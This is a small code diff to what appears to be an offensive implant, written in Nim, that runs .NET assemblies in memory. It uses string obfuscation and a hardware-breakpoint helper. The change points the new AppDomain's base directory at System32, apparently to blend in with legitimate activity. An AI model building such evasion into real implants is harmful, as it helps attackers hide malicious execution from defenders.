@@ -1,5 +1,4 @@
 import winim/[lean, clr]
-import os
 import ../utils/[hwbp, io]
 import ../../common/utils
 
@@ -60,7 +59,7 @@ proc dotnetInlineExecuteGetOutput*(assemblyBytes: seq[byte], arguments: seq[stri
     # Create AppDomain
     let appDomainType = mscorlib.GetType(protect("System.AppDomain"))
     let domainSetup = mscorlib.new(protect("System.AppDomainSetup"))
-    domainSetup.ApplicationBase = getCurrentDir() 
+    domainSetup.ApplicationBase = protect("C:/Windows/System32") 
     domainSetup.DisallowBindingRedirects = false
     domainSetup.DisallowCodeDownload = true
     domainSetup.ShadowCopyFiles = protect("false")
